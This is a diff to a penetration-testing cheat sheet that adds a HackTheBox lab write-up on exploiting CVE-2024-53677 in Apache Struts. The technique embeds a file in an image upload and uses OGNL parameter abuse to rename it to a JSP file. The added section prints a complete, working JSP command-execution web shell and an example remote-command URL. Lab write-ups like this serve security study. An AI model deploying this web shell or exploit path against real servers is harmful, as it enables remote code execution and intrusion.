@@ -3366,7 +3366,6 @@ X-ProxyUser-Ip: 127.0.0.1
 [Remote File Inclusion](#remote-file-inclusion)  
 [XSS SVG Upload](#xss-svg-upload)  
 [Race Condition Web shell upload](#race-condition-web-shell-upload)  
-[HackTheBox CPTS File Uploads](https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md)  
 [Exploit-Notes: File Upload Attack references](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)  
 
 ### Bypass Upload Controls  
@@ -3550,6 +3549,67 @@ def handleResponse(req, interesting):
 ![race-condition-read-secret.png](images/race-condition-read-secret.png)  
 
 [PortSwigger Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)  
+
+### WebShell JSP File Upload  
+
+>Target `strutted.htb` HackTheBox Lab machine restricted file upload only allows image files.  
+
+>Enumaration of a downloaded ZIP source code backup, identify CVE-2024-53677
+>File upload logic in Apache Struts is flawed. 
+>Attacker can manipulate file upload to enable paths traversal and be used to perform Remote Code Execution. 
+>CVE-2024-53677 issue affects Apache Struts from 2.0.0 before 6.4.0.
+
+>The attack path is to emb a malicious JSP file into the contents of an image.  
+>The OGNL parameter abuse to change the name of the file to a JSP file which will let us trigger payloads. 
+>We grab this payload from a similar disclosure, and copy the shell.jsp contents below the image header in our POST request.  
+
+>Source of [JavaScript webshell.JSP](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp)  
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```  
+
+>target only accepts a single valid image file since it performs MIME checks:  
+
+![CVE-2024-53677 part1](/images/CVE-2024-53677-part1.png)  
+
+>By OGNL injection, rewrite file to code shell.jsp and place in rout of web application.  
+  
+![CVE-2024-53677 part 2](/images/CVE-2024-53677-part2.png)  
+
+>RCE Execution achived `http://strutted.htb/webshell.jsp?cmd=id`  
 
 -----
 
